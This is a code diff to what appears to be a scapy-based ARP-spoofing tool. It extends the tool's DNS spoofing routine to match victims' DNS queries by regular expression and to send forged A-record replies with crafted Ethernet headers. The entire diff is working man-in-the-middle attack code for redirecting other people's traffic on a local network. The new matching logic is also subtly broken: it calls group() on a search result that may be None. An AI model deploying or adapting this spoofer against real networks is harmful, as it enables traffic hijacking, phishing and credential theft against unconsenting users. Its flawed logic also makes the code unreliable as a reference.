@@ -1,4 +1,4 @@
-import traceback
+import traceback, re
 import logging, os, sys
 from threading import Thread
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
@@ -30,6 +30,7 @@ class ARPSpoof:
 		self.spoofing = False
 		# dns spoof flags
 		self.dns_dump = False
+		self.regex_match = None
 		self.dns_spoof = False
 		self.dns_spoofed_pair = {} # dns -> spoofed address
 
@@ -104,9 +105,13 @@ class ARPSpoof:
 	def spoof_dns_record(self, pkt):
 		if DNSQR in pkt and UDP in pkt:
 			for i in self.dns_spoofed_pair.keys():
-				if i in pkt[DNSQR].qname:
-					p = IP(src=pkt[IP].dst,dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport,sport=pkt[UDP].dport)/DNS(id=pkt[DNS].id,qr=1L,rd=1L,ra=1L,an=DNSRR(rrname=pkt[DNS].qd.qname,type='A',rclass='IN',ttl=20000,rdata=self.dns_spoofed_pair[i]),qd=pkt[DNS].qd)
-					send(p,count=1)
+				tmp = i.search(pkt[DNSQR].qname)	
+				if not tmp.group(0) is None:
+					#if i in pkt[DNSQR].qname:
+					p = Ether(dst=pkt[Ether].src, src=self.local_mac)
+					p /= IP(src=pkt[IP].dst,dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport,sport=pkt[UDP].dport)
+					p /= DNS(id=pkt[DNS].id,qr=1L,rd=1L,ra=1L,an=DNSRR(rrname=pkt[DNS].qd.qname,type='A',rclass='IN',ttl=20000,rdata=self.dns_spoofed_pair[i]),qd=pkt[DNS].qd)
+					sendp(p,count=1)
 					if self.dns_dump: print '[dbg] caught request to ',pkt[DNSQR].qname
 		del(pkt)
 
@@ -116,14 +121,16 @@ class ARPSpoof:
 	#
 	def init_dns_spoof(self):
 		try:
-			dns_name = raw_input('[!] Enter DNS record to spoof (site): ')
+			dns_name = raw_input('[!] Enter regex to match DNS: ')
 			if dns_name in self.dns_spoofed_pair:
 				Msg('DNS is already being spoofed (%s).'%(self.dns_spoofed_pair[dns_name]))
 				return
-			dns_spoofed = raw_input('[!] Spoof DNS entry for %s to: '%dns_name)
-			tmp = raw_input('[!] Spoof DNS record for %s to %s.  Is this correct? '%(dns_name,dns_spoofed))
+			
+			dns_spoofed = raw_input('[!] Spoof DNS entry matching %s to: '%dns_name)
+			tmp = raw_input('[!] Spoof DNS record matching \'%s\' to \'%s\'.  Is this correct? '%(dns_name,dns_spoofed))
 			if tmp == 'n':
 				return
+			dns_name = re.compile(dns_name)
 			self.dns_spoofed_pair[dns_name] = dns_spoofed
 			self.dns_spoof = True
 			debug('Starting DNS spoofer...')
